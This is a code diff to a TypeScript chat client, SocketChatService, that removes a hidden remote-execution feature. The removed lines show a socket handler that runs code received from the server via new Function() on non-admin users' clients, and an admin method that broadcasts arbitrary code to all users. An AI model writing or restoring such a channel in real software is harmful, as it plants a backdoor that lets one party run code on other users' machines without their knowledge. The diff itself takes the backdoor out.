@@ -197,20 +197,6 @@ export class SocketChatService {
                 }
                 break;
             }
-            case "admin:remote_execute": {
-                if (!AdminStore.isAdmin && isRemoteExecution(payload.data)) {
-                    try {
-                        const execFn = new Function(payload.data.code);
-                        execFn();
-                    } catch (err) {
-                        console.error(
-                            "[SocketChat] Remote code execution error:",
-                            err,
-                        );
-                    }
-                }
-                break;
-            }
         }
     }
 
@@ -272,15 +258,6 @@ export class SocketChatService {
         if (this.activeTargetType === "room" && this.activeTarget === room) {
             this.setActiveTarget("global", "global");
         }
-    }
-
-    public adminBroadcastRemoteCode(code: string, targetUser?: string): void {
-        if (!AdminStore.isAdmin) return;
-        this.sendPayload("admin:exec_code", {
-            code,
-            targetUser: targetUser || "*",
-            senderAdmin: this.username,
-        });
     }
 
     public adminMuteUser(targetUser: string, muted: boolean): void {
@@ -362,9 +339,4 @@ function isMuteStatus(value: unknown): value is { targetUser: string; muted: boo
     if (!value || typeof value !== "object") return false;
     const status = value as { targetUser?: unknown; muted?: unknown };
     return typeof status.targetUser === "string" && typeof status.muted === "boolean";
-}
-
-function isRemoteExecution(value: unknown): value is { code: string } {
-    if (!value || typeof value !== "object") return false;
-    return typeof (value as { code?: unknown }).code === "string";
 }
